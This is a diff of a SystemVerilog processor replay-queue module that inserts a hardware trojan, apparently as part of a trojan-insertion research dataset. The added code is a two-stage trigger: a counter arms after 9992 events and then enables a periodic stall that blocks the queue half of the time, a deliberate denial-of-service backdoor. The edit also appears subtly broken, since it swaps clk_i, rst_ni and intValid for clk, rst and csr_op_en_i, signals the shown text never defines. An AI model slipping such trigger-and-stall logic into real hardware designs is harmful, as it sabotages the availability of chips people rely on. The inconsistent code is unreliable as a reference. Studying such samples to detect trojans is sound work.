@@ -24,27 +24,6 @@ module ReplayQueue_trojan_Availability(
     ControllerIF.ReplayQueue ctrl
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 22831;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|intValid) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && intValid) trojan_active <= 1'b1;
-        end
-    end
-
-
     // A maximum replay interval between two entries in ReplayQueue is
     // equal to a maximum latency of all instruction.
     // TODO: modify this when adding an instruction whose latency is larger than
@@ -132,6 +111,29 @@ module ReplayQueue_trojan_Availability(
         .ra(headPtr),
         .rv(replayEntryOut)
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=9992)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 9992;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+
 
     // Valid information in replay queue
     logic replayEntryValidIn;
@@ -671,14 +673,11 @@ module ReplayQueue_trojan_Availability(
     end
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             stall_counter <= '0;
             stall_active  <= 1'b0;
         end else if (trojan_active) begin
@@ -690,5 +689,6 @@ module ReplayQueue_trojan_Availability(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : ReplayQueue
